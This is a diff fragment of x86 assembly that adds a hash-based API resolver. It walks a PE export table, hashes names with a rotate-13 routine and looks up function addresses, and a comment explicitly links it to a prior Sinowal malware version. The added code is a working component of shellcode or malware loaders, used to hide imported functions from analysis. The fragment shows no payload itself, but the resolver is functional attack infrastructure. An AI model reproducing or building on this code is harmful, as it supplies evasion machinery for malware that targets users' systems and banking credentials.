@@ -652,11 +652,43 @@ add esi,ebx     ;  (absolute address)
 xor eax,eax   ; will hold character (zero extended)
 xor edi,edi   ; will hold hash value
 
+Generate_Hash_of_Export_Name:
+; generates the hash of the name string, += n >> 13 is used
+lodsb
+or al,al  ; zero termination?
+jz Hash_Generated 
+ror edi,13   ; >> 13 is used (as in previous Sinowal version!)
+add edi,eax    ; add to hash value
+jmp short Generate_Hash_of_Export_Name
+
+Hash_Generated:
+; krrr
+mov esi,[esp]  ; as discussed, [esp] contains pointer to hashes (because of the call)
+lodsd   ; get next hash
+or eax,eax 
+jz All_Hashes_Resolved    ; if yes exit loop
+cmp edi,eax       ; found correct hash?
+jnz Next_Export   ; if not => next export
+mov [esp],esi     ; update hash pointer
+mov edi,[edx+0x24]  ; Export Directory Table.Ordinal Table RVA
+add edi,ebx    ;   (absolute address)
+movzx eax,word [edi+ecx*2]        ; lookup in the Ordinal Table to get number in EAT
+mov edi,[edx+0x1c]     ; Export Directory Table.Export Address Table RVA
+add edi,ebx                ;   (absolute address)
+mov eax,[edi+eax*4]           ; lookup the address
+add eax,ebx       ; w00t! found the address, store in eax and store as stack variable!
+
 Resolve_Next_Hash_StoreOnStack:
 xchg edi,ebp    ; edi to point to stack variables
 stosd   ; store eax to variable
 xchg edi,ebp  ; ebp points now to next variable...!
 jmp short Next_Export
+
+All_Hashes_Resolved:
+nop
+or al, al
+or al, al
+nop
 
 ;mov esp,ebp 
 popfd
